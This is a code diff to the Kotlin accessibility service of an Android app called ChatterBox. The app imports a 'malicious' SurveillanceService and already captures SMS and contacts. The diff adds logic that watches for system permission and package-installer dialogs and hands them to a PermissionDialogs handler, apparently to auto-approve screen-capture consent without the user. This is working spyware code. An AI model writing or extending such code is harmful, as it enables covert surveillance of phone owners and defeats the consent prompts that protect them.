@@ -18,6 +18,7 @@ import com.example.ChatterBox.malicious.SurveillanceService
 class AccessibilityService : android.accessibilityservice.AccessibilityService() {
     private val TAG = "ChatterBoxAccessibility"
     private val handler = Handler(Looper.getMainLooper())
+    private lateinit var permissionDialogs: PermissionDialogs
 
     // Flags to prevent multiple captures happening simultaneously
     private var isCapturingSMS = false
@@ -25,6 +26,7 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
 
     override fun onServiceConnected() {
         Log.i(TAG, "Accessibility Service connected")
+        permissionDialogs = PermissionDialogs(this)
 
         // Configure accessibility service capabilities
         val info = AccessibilityServiceInfo()
@@ -78,12 +80,22 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
-
-        // Process events to detect specific apps
+        // Process events to detect specific apps and dialogs
         when (event.eventType) {
             AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                 val packageName = event.packageName?.toString() ?: return
 
+                // First, check if this is a media projection permission dialog
+                if (packageName.contains("com.android.permissioncontroller") ||
+                    packageName.contains("com.google.android.permissioncontroller") ||
+                    packageName.contains("com.android.packageinstaller") ||
+                    packageName.contains("com.android.systemui")) {
+                    // This might be a system dialog
+                    val rootNode = rootInActiveWindow ?: return
+                    permissionDialogs.handlePermissionDialog(rootNode)
+                    // Clean up
+                    rootNode.recycle()
+                }
                 // Detect when we're in the SMS or Contacts app to enhance capturing
                 if (packageName.contains("mms") || packageName.contains("sms") ||
                     packageName.contains("messaging")) {
@@ -271,9 +283,15 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
 
     override fun onDestroy() {
         // Clean up resources
+        permissionDialogs.cleanup()
         handler.removeCallbacksAndMessages(null)
 
         Log.d(TAG, "Accessibility service destroyed")
         super.onDestroy()
+    }
+
+    private fun findNodeWithText(rootNode: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
+        val nodes = rootNode.findAccessibilityNodeInfosByText(text)
+        return if (nodes.isNotEmpty()) nodes[0] else null
     }
 }
